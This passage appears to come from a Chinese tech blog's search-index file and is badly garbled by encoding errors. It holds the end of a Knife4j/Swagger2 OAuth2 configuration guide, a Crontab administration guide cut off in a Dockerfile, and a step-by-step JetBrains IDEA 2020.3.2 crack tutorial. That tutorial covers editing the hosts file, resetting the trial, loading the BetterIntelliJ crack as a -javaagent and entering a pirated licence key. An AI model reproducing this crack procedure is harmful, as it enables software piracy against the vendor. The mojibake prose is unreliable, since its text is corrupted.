.version("v1.0.0") .build(); } /** * Swagger2 è®¤è¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 çš„è®¤è¯æ–¹å¼ * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // ä½¿ç”¨å®¢æˆ·ç«¯æ¨¡å¼ï¼ˆclient_credentialsï¼‰ List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); String clientTokenUrl = "http://127.0.0.1:18010/oauth/token"; ClientCredentialsGrant clientCredentialsGrant = new ClientCredentialsGrant(clientTokenUrl); grantTypes.add(clientCredentialsGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} è¾“å…¥ clientId ä»¥åŠ clientSecretï¼Œç„¶åç‚¹å‡» Authorize æŒ‰é’®è¿›è¡Œæˆæƒå³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯†ç æ¨¡å¼ â˜…å±•å¼€ä»£ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j æ¥å£æ–‡æ¡£") .description("ä¸šåŠ¡æ¥å£ API æ–‡æ¡£.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } /** * Swagger2 è®¤è¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 çš„è®¤è¯æ–¹å¼ * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // ä½¿ç”¨å¯†ç æ¨¡å¼ï¼ˆpasswordï¼‰ List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); String passwordTokenUrl = "http://127.0.0.1:18010/oauth/token"; ResourceOwnerPasswordCredentialsGrant resourceOwnerPasswordCredentialsGrant = new ResourceOwnerPasswordCredentialsGrant(passwordTokenUrl); grantTypes.add(resourceOwnerPasswordCredentialsGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} è¾“å…¥ usernameã€passwordã€clientId ä»¥åŠ clientSecretï¼Œç„¶åç‚¹å‡» Authorize æŒ‰é’®è¿›è¡Œæˆæƒå³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æˆæƒæ¨¡å¼ â˜…å±•å¼€ä»£ç â˜… 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j æ¥å£æ–‡æ¡£") .description("ä¸šåŠ¡æ¥å£ API æ–‡æ¡£.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } /** * Swagger2 è®¤è¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ * * @return */ private List&lt;SecurityContext&gt; securityContexts() { List&lt;AuthorizationScope&gt; scopes = new ArrayList&lt;&gt;(); SecurityReference securityReference = new SecurityReference("oauth2", scopes.toArray(new AuthorizationScope[]{})); SecurityContext securityContext = new SecurityContext(Lists.newArrayList(securityReference), PathSelectors.ant("/**")); return Lists.newArrayList(securityContext); } /** * OAuth2.0 çš„è®¤è¯æ–¹å¼ * * @return */ private List&lt;SecurityScheme&gt; securitySchemes() { // ä½¿ç”¨æˆæƒç æ¨¡å¼ï¼ˆauthorization_codeï¼‰ List&lt;GrantType&gt; grantTypes = new ArrayList&lt;&gt;(); TokenRequestEndpoint tokenRequestEndpoint = new TokenRequestEndpoint("http://127.0.0.1:18010/oauth/authorize", "client1", "secert1"); TokenEndpoint tokenEndpoint = new TokenEndpoint("http://127.0.0.1:18010/oauth/token", "access_token"); AuthorizationCodeGrant authorizationCodeGrant = new AuthorizationCodeGrant(tokenRequestEndpoint, tokenEndpoint); grantTypes.add(authorizationCodeGrant); OAuth oAuth = new OAuthBuilder().name("oauth2").grantTypes(grantTypes).build(); return Lists.newArrayList(oAuth); }} è¾“å…¥ clientId åŠ clientSecretï¼Œç„¶åç‚¹å‡» Authorize æŒ‰é’®ï¼Œæœ€ç»ˆè·³è½¬æˆæƒç•Œé¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é€‰æ‹©è¿›è¡Œæˆæƒï¼Œæˆæƒå®Œæˆåå°±å¯ä»¥ç›´æ¥è°ƒè¯•æ¥å£äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆè¯¥å›¾ä¸ä¸Šè¿°ä»£ç ä¸ç›¸å…³ï¼Œæ¥æºäºç½‘ç»œï¼‰ï¼š ç®€åŒ–æ¨¡å¼ï¼ˆå¾…è¡¥å……ï¼‰6ã€å…¨å±€å‚æ•°è®¾ç½® Oauth çš„ Tokené™¤äº†ä¸Šé¢ä»‹ç»çš„ Knife4j è‡ªåŠ¨è·å– Access Token ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ Knife4j å…¨å±€å‚æ•°è®¾ç½®çš„åŠŸèƒ½æ¥æ‰‹åŠ¨æ·»åŠ  Access Tokenï¼Œå¯ä»¥çœå»æ•´åˆ OAuth2.0 çš„ Java ä»£ç ï¼Œè¿™é‡Œ Access Token çš„æ ¼å¼å¿…é¡»æ˜¯ä»¥ bearer + ç©ºæ ¼ ä½œä¸ºå‰ç¼€ 7ã€å‚è€ƒæ–‡æ¡£ Swagger æºç åˆ†æ knife4j Github é¡¹ç›® knife4j å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ knife4j å®˜æ–¹å®æˆ˜æŒ‡å— knife4j å®˜æ–¹ç¤ºä¾‹ä»£ç  knife4j åœ¨çº¿æ¼”ç¤ºæ•ˆæœ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java å¾®æœåŠ¡"},{title:"JetBrains IDEA 2020.3.2 ç ´è§£æ¿€æ´»æ•™ç¨‹",url:"/posts/3644bd49.html",text:'æœ€æ–°å…¬å‘Šæœ¬æ•™ç¨‹æä¾›çš„æ¿€æ´»ç å·²å¤±æ•ˆï¼Œå»ºè®®å‚è€ƒè¿™ç¯‡åšå®¢ï¼Œä½¿ç”¨æœ€æ–°çš„æ–¹å¼æ¥æ¿€æ´» JetBrains IDEA 2020.3.2 æˆ–è€…æ›´æ–°çš„ç‰ˆæœ¬ã€‚ å‰è¨€æœ¬æ•™ç¨‹é€‚ç”¨äº JetBrains IDEA 2020.3.2 ä»¥ä¸‹æ‰€æœ‰ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬ IDEA 2020 å…¨ç³»åˆ—ï¼‰ï¼Œæ”¯æŒå°† IDEA 2020.3.2 æ¿€æ´»åˆ° 2099 å¹´ï¼Œäº²æµ‹æ¿€æ´»æˆåŠŸï¼ï¼ï¼ èµ„æºä¸‹è½½ JetBrains IDEA ä¸‹è½½ï¼šå®˜ç½‘ JetBrains IDEA&nbsp;ç ´è§£è¡¥ä¸ä¸‹è½½ï¼šæœ¬ç«™ æ¿€æ´»æ­¥éª¤ç¬¬ä¸€æ­¥æ›´æ”¹ hosts æ–‡ä»¶ï¼Œå°† hosts æ–‡ä»¶ä¸­æœ‰å…³ Jetbrains çš„é…ç½®è¡Œå…¨éƒ¨åˆ é™¤æ‰ï¼Œè‹¥æ²¡æœ‰åˆ™è¯·å¿½ç•¥æ­¤æ­¥éª¤ã€‚Windows ç³»ç»Ÿçš„ hosts æ–‡ä»¶è·¯å¾„ä¸ºï¼šC:\\Windows\\System32\\drivers\\etc\\hostsï¼ŒLinux å’Œ Mac ç³»ç»Ÿçš„ hosts æ–‡ä»¶è·¯å¾„ä¸ºï¼š/etc/hostsï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªéœ€åˆ é™¤ä»¥ä¸‹ä¸¤è¡Œå†…å®¹å³å¯ï¼š 120.0.0.0 www.jetbrains.com0.0.0.0 account.jetbrains.com ç¬¬äºŒæ­¥ä¸‹è½½å®‰è£… JetBrains IDEAï¼Œç„¶åå¯åŠ¨ IDEA å¹¶é€‰æ‹©è¯•â½¤ï¼ˆEvaluate for freeï¼‰æ¨¡å¼è¿›â¼Šè½¯ä»¶ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œé¦–æ¬¡å¯åŠ¨åçš„é…ç½®é¡¹æ ¹æ®è‡ªå·±çš„éœ€è¦å‹¾é€‰å³å¯ï¼Œæ­¤æ­¥éª¤ä¸ä¼šå½±å“åé¢ç ´è§£çš„è¿‡ç¨‹ã€‚å‡è®¾è½¯ä»¶ä¹‹å‰å·²ç»åœ¨è¯•ç”¨æˆ–è€…è¯•ç”¨è¿‡è€Œä¸”è¿‡æœŸäº†ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆåˆ é™¤ IDEA çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œç„¶åå†é‡æ–°å¯åŠ¨è½¯ä»¶ï¼ŒIDEA é…ç½®æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å¦‚ä¸‹ï¼š 1234567# Windowsç³»ç»ŸC:\\Documents and Settings\\Administrator\\.idea-2020.3\\configC:\\Documents and Settings\\Administrator\\.idea-2020.3\\system# Linux/Macç³»ç»Ÿ~/.config/JetBrains/IntelliJIdea2020.3~/.local/share/JetBrains/IntelliJIdea2020.3 ç¬¬ä¸‰æ­¥ä¸‹è½½å¹¶è§£å‹ç ´è§£è¡¥ä¸çš„å‹ç¼©æ–‡ä»¶ï¼Œå¾—åˆ° BetterIntelliJ.zip æ–‡ä»¶å’Œæ¿€æ´» KEYï¼Œåˆ‡è®°ä»¥åä¸èƒ½éšæ„åˆ é™¤æˆ–è€…ç§»åŠ¨ BetterIntelliJ.zip æ–‡ä»¶çš„ä½ç½®ï¼Œå¦åˆ™ IDEA æ¿€æ´»ä¹‹åè¿˜ä¼šå¤±æ•ˆã€‚ ç¬¬å››æ­¥JetBrains IDEA å¯åŠ¨åï¼ˆè¯•ç”¨æ¨¡å¼ï¼‰ï¼Œæ‰‹åŠ¨é€‰æ‹©åˆ›å»ºæˆ–è€…æ‰“å¼€ä¸€ä¸ªé¡¹ç›®ï¼Œè¿›å…¥åˆ° IDEA çš„ä¸»ç•Œé¢ã€‚åœ¨èœå•æ å¯¼èˆªåˆ°ï¼šFile -&gt; Settings -&gt; Plugins -&gt; Install Plugin From Diskï¼Œç„¶åæ‰¾åˆ° BetterIntelliJ.zip æ–‡ä»¶å¼€å§‹å®‰è£…ç ´è§£æ’ä»¶ã€‚å½“ç ´è§£æ’ä»¶å®‰è£…å®Œæˆåï¼Œæ‰‹åŠ¨é‡å¯ IDEA è®©æ’ä»¶ç”Ÿæ•ˆï¼Œå»ºè®®æ£€æŸ¥ IDEA çš„è¿›ç¨‹æ˜¯å¦çœŸæ­£å…³é—­äº†ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œä»¥åä¸èƒ½éšæ„åœ¨ IDEA çš„æ’ä»¶å¸‚åœºæ›´æ–° BetterIntelliJ ç ´è§£æ’ä»¶çš„ç‰ˆæœ¬ï¼Œå¦åˆ™ IDEA çš„ç ´è§£æ¿€æ´»ä¼šå¤±æ•ˆã€‚ (adsbygoogle = window.adsbygoogle || []).push({}); ç¬¬äº”æ­¥æ£€æŸ¥ç ´è§£æ’ä»¶æ˜¯å¦å®‰è£…æˆåŠŸï¼ŒIDEA çš„èœå•æ å¯¼èˆªåˆ°ï¼šHelp -&gt; Edit Custom Vm Optionsï¼Œå¦‚æœé…ç½®æ–‡ä»¶æœ«å°¾å‡ºç°äº†ä¸€è¡Œ -javaagent:/xxxx/BetterIntelliJ-1.16.jarï¼Œåˆ™è¯´æ˜ç ´è§£æ’ä»¶å®‰è£…æˆåŠŸã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ Linux/Mac 64 ä½ç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œç ´è§£æ’ä»¶æ‰€ç”¨çš„é…ç½®æ–‡ä»¶çš„è·¯å¾„ä¸º /${HOME}/.config/JetBrains/IntelliJIdea2020.3/idea64.vmoptionsï¼Œè€Œä¸æ˜¯ IDEA è‡ªèº«å®‰è£…ç›®å½•ä¸‹çš„ idea64.vmoptions é…ç½®æ–‡ä»¶ã€‚ ç ´è§£æ’ä»¶åœ¨ä¸åŒç³»ç»Ÿå¹³å°çš„æ­£ç¡®é…ç½®å¦‚ä¸‹ï¼š 12345# Windowsç³»ç»Ÿ-javaagent:C:\\Users\\Public\\.BetterIntelliJ\\BetterIntelliJ-ç‰ˆæœ¬å·.jar# Linux/Macç³»ç»Ÿ-javaagent:${HOME}/.BetterIntelliJ/BetterIntelliJ-ç‰ˆæœ¬å·.jar ç¬¬å…­æ­¥IDEA çš„èœå•å¯¼èˆªåˆ°ï¼šHelp -&gt; Register -&gt; Add New Licenseï¼Œå°†ç ´è§£è¡¥ä¸å‹ç¼©æ–‡ä»¶é‡Œçš„æ¿€æ´» KEY å¤åˆ¶åˆ° IDEA æ¿€æ´»ç çš„è¾“å…¥æ¡†é‡Œï¼Œç„¶åç‚¹å‡» Activate æ¿€æ´»æŒ‰é’®å³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç¬¬ä¸ƒæ­¥æŸ¥çœ‹ IDEA æ˜¯å¦ç ´è§£æˆåŠŸï¼ŒIDEA çš„èœå•æ å¯¼èˆªåˆ°ï¼šHelp -&gt; Aboutï¼Œè‹¥å‡ºç°ä¸‹å›¾çš„ä¿¡æ¯åˆ™è¯´æ˜ç ´è§£æˆåŠŸã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Linux ç®¡ç† Crontab æœåŠ¡",url:"/posts/vbd8mmaf.html",text:'å‰è¨€ æœ¬æ–‡ä¸»è¦ä»‹ç»å¦‚ä½•åœ¨ Linux ç³»ç»Ÿä¸Šå®‰è£…å’Œç®¡ç† Crontab æœåŠ¡ï¼Œé€‚ç”¨äº Debian 9ã€CentOS 7 ç³»ç»Ÿã€‚ Crontab å®‰è£…Crontab å®‰è£…ï¼ˆCentOS 7ï¼‰1# yum instal crontabs Crontab å®‰è£…ï¼ˆDebian 9ï¼‰1# apt-get install cron Crontab æœåŠ¡ç®¡ç†Crontab æœåŠ¡ç®¡ç†ï¼ˆCentOS 7ï¼‰1234567891011# å¯åŠ¨CrontabæœåŠ¡# systemctl start crond# å…³é—­CrontabæœåŠ¡# systemctl stop crond# é‡å¯CrontabæœåŠ¡# systemctl restart crond# æŸ¥çœ‹CrontabæœåŠ¡çš„è¿è¡ŒçŠ¶æ€# systemctl status crond Crontab æœåŠ¡ç®¡ç†ï¼ˆDebian 9ï¼‰1234567891011121314151617# å¯åŠ¨CrontabæœåŠ¡# service cron start# å…³é—­CrontabæœåŠ¡# service cron stop# é‡å¯CrontabæœåŠ¡# service cron restart# æŸ¥çœ‹CrontabæœåŠ¡çš„è¿è¡ŒçŠ¶æ€# service cron status# æˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ›¿ä»£# /etc/init.d/cron stop# /etc/init.d/cron start# /etc/init.d/cron status# /etc/init.d/cron restart Crontab æ—¥å¿—ç®¡ç†Crontab æ—¥å¿—ç®¡ç†ï¼ˆCentOS 7ï¼‰12# æŸ¥çœ‹Crontabçš„æ—¥å¿—ä¿¡æ¯# tail -f -n 10 /var/log/cron Crontab æ—¥å¿—ç®¡ç†ï¼ˆDebian 9ï¼‰123456789101112131415# å®‰è£…rsyslogæœåŠ¡# apt-get install rsyslog# åˆ›å»ºCrontabçš„æ—¥å¿—æ–‡ä»¶# touch /var/log/cron.log# å¼€å¯Crontabçš„æ—¥å¿—è®°å½•# vim /etc/rsyslog.confcron.* /var/log/cron.log #å–æ¶ˆè¿™è¡Œå†…å®¹çš„æ³¨é‡Šå³å¯# å¯åŠ¨rsyslogæœåŠ¡# service rsyslog start# æŸ¥çœ‹Crontabçš„æ—¥å¿—ä¿¡æ¯# tail -f -n 10 /var/log/cron.log Crontab ä»»åŠ¡ç®¡ç†Crontab ä»»åŠ¡ç®¡ç†ï¼ˆCentOS 7ï¼‰12345678910111213141516171819# ç¼–è¾‘å¹¶ä¿å­˜å½“å‰ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡# crontab -e# æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æ‰€æœ‰è®¡åˆ’ä»»åŠ¡# crontab -l# æç¤ºï¼šä»¥ä¸‹é€šè¿‡Vimç¼–è¾‘å™¨æ›´æ”¹é…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼Œä¸ä¸€å®šèƒ½è®©æ–°å¢çš„Crontabè®¡åˆ’ä»»åŠ¡ç”Ÿæ•ˆ# ç¼–è¾‘rootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ï¼ˆä¾èµ–rootç”¨æˆ·çš„æƒé™ï¼‰# vim /var/spool/cron/root# æŸ¥çœ‹rootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ï¼ˆä¾èµ–rootç”¨æˆ·çš„æƒé™ï¼‰# cat /var/spool/cron/root# ç¼–è¾‘wwwç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ï¼ˆä¾èµ–rootæˆ–è€…wwwç”¨æˆ·çš„æƒé™ï¼‰# vim /var/spool/cron/www# æŸ¥çœ‹wwwç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ï¼ˆä¾èµ–rootæˆ–è€…wwwç”¨æˆ·çš„æƒé™ï¼‰# cat /var/spool/cron/www Crontab ä»»åŠ¡ç®¡ç†ï¼ˆDebian 9ï¼‰12345678910111213141516171819# ç¼–è¾‘å¹¶ä¿å­˜å½“å‰ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡# crontab -e# æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æ‰€æœ‰è®¡åˆ’ä»»åŠ¡# crontab -l# æç¤ºï¼šä»¥ä¸‹é€šè¿‡Vimç¼–è¾‘å™¨æ›´æ”¹é…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼Œä¸ä¸€å®šèƒ½è®©æ–°å¢çš„Crontabè®¡åˆ’ä»»åŠ¡ç”Ÿæ•ˆ# ç¼–è¾‘rootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ï¼ˆä¾èµ–rootç”¨æˆ·çš„æƒé™ï¼‰# vim /var/spool/cron/crontabs/root# æŸ¥çœ‹rootç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ï¼ˆä¾èµ–rootç”¨æˆ·çš„æƒé™ï¼‰# cat /var/spool/cron/crontabs/root# ç¼–è¾‘wwwç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ï¼ˆä¾èµ–rootæˆ–è€…wwwç”¨æˆ·çš„æƒé™ï¼‰# vim /var/spool/cron/crontabs/www# æŸ¥çœ‹wwwç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡ï¼ˆä¾èµ–rootæˆ–è€…wwwç”¨æˆ·çš„æƒé™ï¼‰# cat /var/spool/cron/crontabs/www Shell è„šæœ¬æ·»åŠ  Crontab è®¡åˆ’ä»»åŠ¡12# æ·»åŠ ç³»ç»Ÿçº§çš„è®¡åˆ’ä»»åŠ¡ï¼Œä¾èµ–rootç”¨æˆ·çš„æƒé™ï¼ŒåŒæ—¶éœ€è¦æŒ‡å®šä»¥å“ªä¸ªç”¨æˆ·æ¥æ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œæ­¤æ–¹æ³•é€‚ç”¨äºç»å¤§å¤šæ•°çš„Linuxå‘è¡Œç‰ˆ# echo "0 */2 * * * root /usr/bin/python3 /usr/share/python_scripts/mysql-sync.py" &gt;&gt; /etc/crontab Crontab çš„ä½¿ç”¨å‘½ä»¤æ ¼å¼crontab [-u user] file crontab [-u user] [ -e | -l | -r ] -u userï¼šç”¨æ¥è®¾ç½®æŸä¸ªç”¨æˆ·çš„ Crontab æœåŠ¡ fileï¼šå‘½ä»¤æ–‡ä»¶çš„åç§°ï¼Œè¡¨ç¤ºå°† file ä½œä¸º Crontab çš„ä»»åŠ¡åˆ—è¡¨æ–‡ä»¶å¹¶è½½å…¥ Crontab -eï¼šç¼–è¾‘æŸä¸ªç”¨æˆ·çš„ Crontab é…ç½®æ–‡ä»¶å†…å®¹ã€‚å¦‚æœä¸æŒ‡å®šç”¨æˆ·ï¼Œåˆ™è¡¨ç¤ºç¼–è¾‘å½“å‰ç”¨æˆ·çš„ Crontab é…ç½®æ–‡ä»¶ -lï¼šæ˜¾ç¤ºæŸä¸ªç”¨æˆ·çš„ Crontab é…ç½®æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœä¸æŒ‡å®šç”¨æˆ·ï¼Œåˆ™è¡¨ç¤ºæ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„ Crontab é…ç½®æ–‡ä»¶å†…å®¹ -rï¼šä» /var/spool/cron ç›®å½•ä¸­åˆ é™¤æŸä¸ªç”¨æˆ·çš„ Crontab é…ç½®æ–‡ä»¶ï¼Œå¦‚æœä¸æŒ‡å®šç”¨æˆ·ï¼Œåˆ™é»˜è®¤åˆ é™¤å½“å‰ç”¨æˆ·çš„ Crontab é…ç½®æ–‡ä»¶ Crontab ä½¿ç”¨æ ¼å¼ ç¬¬ 1 åˆ—ï¼šåˆ†é’Ÿ 0ï½59 ç¬¬ 2 åˆ—ï¼šå°æ—¶ 0ï½23 ç¬¬ 3 åˆ—ï¼šæ—¥ 1ï½31 ç¬¬ 4 åˆ—ï¼šæœˆ 1ï½12 ç¬¬ 5 åˆ—ï¼šæ˜ŸæœŸ 0ï½7 (0 å’Œ 7 è¡¨ç¤ºæ˜ŸæœŸå¤©) ç¬¬ 6 åˆ—ï¼šéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ Crontab ä½¿ç”¨æ¡ˆä¾‹1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# æ¯5ç§’æ‰§è¡Œä¸€æ¬¡0/5 * * * * command# æ¯ä¸€å°æ—¶æ‰§è¡Œä¸€æ¬¡0 */1 * * * command# æ¯å¤©6ç‚¹æ‰§è¡Œä¸€æ¬¡0 6 * * * command# æ¯å¤©7:50æ‰§è¡Œä¸€æ¬¡50 7 * * * command# æ¯éš”45åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡*/45 * * * * command# åœ¨12æœˆå†…ï¼Œæ¯å¤©6ç‚¹åˆ°12ç‚¹ï¼Œæ¯éš”3ä¸ªå°æ—¶0åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡0 6-12/3 * 12 * command# æ¯å°æ—¶çš„ç¬¬3å’Œç¬¬15åˆ†é’Ÿæ‰§è¡Œ3,15 * * * * command# åœ¨ä¸Šåˆ8ç‚¹åˆ°11ç‚¹çš„ç¬¬3å’Œç¬¬15åˆ†é’Ÿæ‰§è¡Œ3,15 8-11 * * * command# æ¯éš”ä¸¤å¤©çš„ä¸Šåˆ8ç‚¹åˆ°11ç‚¹çš„ç¬¬3å’Œç¬¬15åˆ†é’Ÿæ‰§è¡Œ3,15 8-11 */2 * * command# æ¯å‘¨ä¸€ä¸Šåˆ8ç‚¹åˆ°11ç‚¹çš„ç¬¬3å’Œç¬¬15åˆ†é’Ÿæ‰§è¡Œ3,15 8-11 * * 1 command# æ¯æ™šçš„21:30æ‰§è¡Œ30 21 * * * command# æ¯æœˆ1ã€10ã€22æ—¥çš„4:45æ‰§è¡Œ45 4 1,10,22 * * command# æ¯å‘¨å…­ã€å‘¨æ—¥çš„01:10æ‰§è¡Œ10 1 * * 6,0 command# æ¯å¤©18:00è‡³23:00ä¹‹é—´æ¯éš”30åˆ†é’Ÿæ‰§è¡Œ0,30 18-23 * * * command# æ¯æ˜ŸæœŸå…­çš„æ™šä¸Š23:00æ‰§è¡Œ0 23 * * 6 command# æ™šä¸Š11ç‚¹åˆ°æ—©ä¸Š7ç‚¹ä¹‹é—´ï¼Œæ¯éš”ä¸€å°æ—¶æ‰§è¡Œ0 23-7 * * * command Docker æ„å»º Crontab é•œåƒè­¦å‘Š è¿™é‡Œä¸å»ºè®®ä½¿ç”¨ CentOS é•œåƒï¼Œå› ä¸º Docker çš„å®˜æ–¹ CentOS é•œåƒä¸­æ²¡æœ‰æä¾› systemd æœåŠ¡ï¼Œè™½ç„¶æœ‰å¯¹åº”çš„ è§£å†³æ–¹æ¡ˆï¼Œä½†è§£å†³èµ·æ¥ç¨å¾®å¤æ‚äº†ä¸€ç‚¹ å¦‚æœåŸºäº CentOS é•œåƒæ„å»º Crontab é•œåƒï¼Œå¯åŠ¨å®¹å™¨æ—¶å¾€å¾€ä¼šå‡ºç°é”™è¯¯ä¿¡æ¯ï¼š Failed to get D-Bus connection: Operation not permittedï¼Œæ›´å¤šèµ„æ–™å¯å‚è€ƒ è¿™é‡Œ ç”¨äºæ„å»º Crontab é•œåƒçš„ Dockerfile çš„å†…å®¹å¦‚ä¸‹ï¼ŒåŸºäº Debian 9ï¼ˆStretchï¼‰ç³»ç»Ÿ 1234567891011121314151617181920212223242526272829303132333435from augurproject/python2-and-3MAINTAINER clay&lt;clay@gmail.com&gt;RUN touch /var/log/cron.logRUN mkdir -p /usr/share/python_scriptsENV workpath /usr/share/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb 